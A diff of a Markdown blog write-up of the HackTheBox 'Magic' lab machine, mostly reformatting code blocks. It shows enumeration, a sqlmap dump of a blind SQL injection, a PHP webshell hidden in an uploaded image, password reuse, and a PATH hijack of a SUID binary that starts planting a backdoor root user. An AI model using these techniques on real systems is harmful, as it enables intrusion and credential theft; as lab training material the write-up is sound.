@@ -12,35 +12,36 @@ tags:
 I decided to go back to Linux for my next challenge box from TJNull's [list of OSCP-like HackTheBox machines][htb-list]. This is also the first box from the list that HTB ranked "Medium" so it should bring a nice challenge.
 
 ## Phase 1: Enumeration
+
 Step 1: Kick off [AutoRecon][autorecon]
 
 ```bash
-$ autorecon -o magic --single-target 10.10.10.185 
+autorecon -o magic --single-target 10.10.10.185 
 ```
 
 From the quick `nmap` scan I can see that we have SSH and HTTP open.
 
-```
+```txt
 [*] Found ssh on tcp/22 on target 10.10.10.185
 [*] Found http on tcp/80 on target 10.10.10.185
 ```
 
-I want to start testing on the web-server, but whenever I test a boot2root box I always do a quick check to make sure that the SSH service isn't using any [bad keys][bad-keys]. 
+I want to start testing on the web-server, but whenever I test a boot2root box I always do a quick check to make sure that the SSH service isn't using any [bad keys][bad-keys].
 
 ```bash
-$ cd ~/tools/ssh-badkeys
-$ grep -R "AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6" .
+cd ~/tools/ssh-badkeys
+grep -R "AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6" .
 ```
 
 No bad keys here, so its time to look at the web server. `autorecon` will kick off some directory enumeration for us, but I always like to use a few different wordlists for better coverage. I'm going to kick off a `ffuf` scan to run while I review the `autorecon` output.
 
 ```bash
-$ ffuf -u http://10.10.10.185/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .php,.html,.txt -of csv -o raft-large.csv
+ffuf -u http://10.10.10.185/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .php,.html,.txt -of csv -o raft-large.csv
 ```
 
 This run ended up identifying the same endpoints that the `autorecon` GoBuster run identified. The interesting ones were:
 
-```
+```txt
 /login.php            (Status: 200) [Size: 4221]
 /upload.php           (Status: 302) [Size: 2957] [--> login.php]
 ```
@@ -58,13 +59,14 @@ However, if I submit an apostrophe in that the password field then I can see tha
 This is clearly SQL injection, but I wasn't able to get any data back in-band from the host. I tried for about 30 minutes to exploit this SQLi manually, but after a bit of testing I confirmed my suspicions that this was a blind SQLi.
 
 ## Phase 2: Exploitation
+
 Now that I know this is vulnerable to a blind SQL injection, I am going to use `sqlmap` to help me automate the table dumping process (because I can't be bothered to exploit blind SQLi manually). I'm using 8 threads to speed up the process.
 
 ```bash
-$ sqlmap -r login.txt --dbms=mysql --threads=8 --batch -D Magic -T login --dump
+sqlmap -r login.txt --dbms=mysql --threads=8 --batch -D Magic -T login --dump
 ```
 
-```
+```txt
 Database: Magic
 Table: login
 [1 entry]
@@ -80,6 +82,7 @@ Looks like I have some creds to try, and if I submit these through the web porta
 ![](/assets/images/HTB/magic/auth.png)
 
 This file upload was tricky to bypass, and took me some time to exploit. The usual tricks of using a `%00` in the filename, changing the MIME type, and using double extensions (.png.php) didn't work. I learned a useful methodology for testing file uploads from this box. First, proxy a file upload request and send it to repeater. Send it again in Repeater to make sure you can establish a baseline, then start testing some of the common checks against file uploads. For instance:
+
 - Double extensions (with and without Null Byte)
 - Changing MIME type or Magic bytes
 - Embedding server-side code within an image
@@ -89,7 +92,7 @@ For this box the solution was to embed server-side code (in this case PHP) into 
 
 ![](/assets/images/HTB/magic/file-upload.png)
 
-If I go back to the main page of the application, I can see a request for the http://10.10.10.185/images/uploads/exploit.php.jpg endpoint show up in the proxy history. Browsing to this page and supplying the `cmd` parameter results in command execution showing up in the application response.
+If I go back to the main page of the application, I can see a request for the <http://10.10.10.185/images/uploads/exploit.php.jpg> endpoint show up in the proxy history. Browsing to this page and supplying the `cmd` parameter results in command execution showing up in the application response.
 
 ![](/assets/images/HTB/magic/webshell.png)
 
@@ -105,23 +108,24 @@ www-data@ubuntu:/var/www/Magic/images/uploads$
 ```
 
 ## Phase 3: Privilege Escalation
-Now that I have a shell on the box, the next step is to escalate privileges. A quick `cat /etc/passwd` shows that there is one non-standard user on this host 
 
-```
+Now that I have a shell on the box, the next step is to escalate privileges. A quick `cat /etc/passwd` shows that there is one non-standard user on this host
+
+```txt
 theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
 ```
 
 Seems like this theseus is also a user on this machine... what are the odds he uses the same password from the web application.
 
-```
+```txt
 www-data@ubuntu:/tmp$ su theseus
 Password:
 theseus@ubuntu:/tmp$
 ```
 
-Sweet! Now that I have access to the user account, it is time to move onto getting root privileges. When I ran [AutoRecon][autorecon] something new stood out to me, there was a new SUID binary that I hadn't encountered before.
+Sweet! Now that I have access to the user account, it is time to move onto getting root privileges. When I ran [linpeas][linpeas] something new stood out to me, there was a new SUID binary that I hadn't encountered before.
 
-```
+```txt
 -rwsr-x--- 1 root    users            22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary)
 ----------------------------------------------------------------------------------------
   --- Trying to execute /bin/sysinfo with strace in order to look for hijackable libraries...
@@ -141,7 +145,7 @@ openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libm.so.6", O_RDONLY|O_CLOEXEC) = 3
 read(3, fdisk: cannot open /dev/loop0: Permission denied
 ```
 
-AutoRecon had run `strace` on the binary to see what files it was opening, but that only revealed that it was trying to load some libraries from `/etc` that didn't exist. I ran `ltrace` on the binary to get some more information about what files and commands it may be using, specifically looking for the `popen()` function to look for command calls it may make. 
+AutoRecon had run `strace` on the binary to see what files it was opening, but that only revealed that it was trying to load some libraries from `/etc` that didn't exist. I ran `ltrace` on the binary to get some more information about what files and commands it may be using, specifically looking for the `popen()` function to look for command calls it may make.
 
 ```bash
 theseus@ubuntu:/tmp$ ltrace sysinfo
@@ -149,7 +153,7 @@ theseus@ubuntu:/tmp$ ltrace sysinfo
 popen("fdisk -l", "r")
 ```
 
-This call is interesting because the program doesn't specify the full path of the `fdisk` binary that it calls. This means that I can place an arbitrary `fdisk` executable file somewhere in the PATH before the intended `fdisk` executable, and have my file execute as root instead. My go-to for boot2root files is adding a backdoor root user with the password "secret". 
+This call is interesting because the program doesn't specify the full path of the `fdisk` binary that it calls. This means that I can place an arbitrary `fdisk` executable file somewhere in the PATH before the intended `fdisk` executable, and have my file execute as root instead. My go-to for boot2root files is adding a backdoor root user with the password "secret".
 
 ```bash
 theseus@ubuntu:/tmp$ echo -e '#!/bin/bash
